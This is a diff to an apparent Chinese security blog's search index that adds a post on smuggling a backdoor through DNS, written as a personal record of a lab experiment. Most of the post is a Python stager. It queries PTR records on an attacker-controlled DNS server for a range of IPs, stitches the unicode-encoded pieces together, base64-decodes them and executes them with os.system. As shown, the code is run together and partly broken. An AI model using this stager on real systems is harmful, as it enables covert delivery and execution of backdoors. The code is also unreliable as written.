@@ -3,6 +3,21 @@
   
     
     <entry>
+      <title>PYTHON通过DNS协议传输后门</title>
+      <link href="/2018/10/13/PYTHON%E9%80%9A%E8%BF%87DNS%E5%8D%8F%E8%AE%AE%E4%BC%A0%E8%BE%93%E5%90%8E%E9%97%A8/"/>
+      <url>/2018/10/13/PYTHON%E9%80%9A%E8%BF%87DNS%E5%8D%8F%E8%AE%AE%E4%BC%A0%E8%BE%93%E5%90%8E%E9%97%A8/</url>
+      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>首先吐槽一下，，做了一天护网杯的题发现一题也做不了。我擦。。。心情mmp，然后这个实验是在上学的时候在FB看到的。这里的我也实验了一遍就当做个记录<br><img src="https://s1.ax1x.com/2018/10/13/iNoicj.jpg" alt=""></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>先放出FB看的那篇文章吧</p><pre><code>转自Freebuf</code></pre><p>DNS后门与检测：<code>http://www.freebuf.com/articles/network/185324.html</code></p><p><strong>思路</strong></p><pre><code>这篇文章的主要思路是通过DNS的PTR记录存放payload然后，用python获取数据进行拼接payload。</code></pre><p>实现过程：</p><pre><code>需要环境：Windows server 2008 和 Kali1.首先用windows server 2008搭建好DNS服务</code></pre><p><img src="https://s1.ax1x.com/2018/10/13/iNoobq.png" alt=""></p><pre><code>2.创建数个PTR记录，放入payload,我这里将其进unicode编码</code></pre><p><img src="https://s1.ax1x.com/2018/10/13/iNob5T.md.png" alt=""></p><pre><code>3.写代获取payload并进行拼接，然后执行import osimport redef zx():    xj=open(&apos;zc.txt&apos;,&apos;w&apos;)    xj.close()    gl=[]    payload=[]    for r in range(101,176):        qq=os.popen(&apos;nslookup -qtr=ptr 192.168.89.{}&apos;.format(r)) #使用nslookup获得这段IP的ptr记录        zz=re.findall(&apos;name = .*&apos;,qq.read()) #正则进行过滤        for k in zz:            sc=str(k).replace(&quot;name = &quot;,&apos;&apos;)            gl.append(sc)    for z in gl:        dw=re.findall(&apos;[u][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z]&apos;,str(z))        for w in dw:            dwe=&apos;\\&apos;+w #在DNS中是没有斜杆的得自己手动加上            print(dwe,end=&apos;&apos;,file=open(&apos;zc.txt&apos;,&apos;a&apos;))    dk=open(&apos;zc.txt&apos;,&apos;r&apos;)    reads=dk.read()    exploit=reads.encode(&apos;utf-8&apos;).decode #编码成字符串 (&apos;unicode_escape&apos;)    mls=&quot;&quot;&quot;python -c &quot;exec(&apos;{}&apos;.decode(&apos;base64&apos;)){}&quot;&quot;&quot;.format(exploit,&apos;&quot;&apos;)    os.system(mls) #执行zx()</code></pre><p>测试结果如下：</p><p><img src="https://s1.ax1x.com/2018/10/13/iNT2e1.png" alt=""></p><p><img src="https://s1.ax1x.com/2018/10/13/iNTRdx.png" alt=""></p><p>音乐：<embed src="//music.163.com/style/swf/widget.swf?sid=531925&type=2&auto=1&width=320&height=66" width="340" height="86" allownetworking="all"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
+      
+      
+        <tags>
+            
+            <tag> Writing </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    <entry>
       <title>CreateSpace.Hacker3读书笔记（一）</title>
       <link href="/2018/10/06/CreateSpace-Hacker3%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
       <url>/2018/10/06/CreateSpace-Hacker3%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
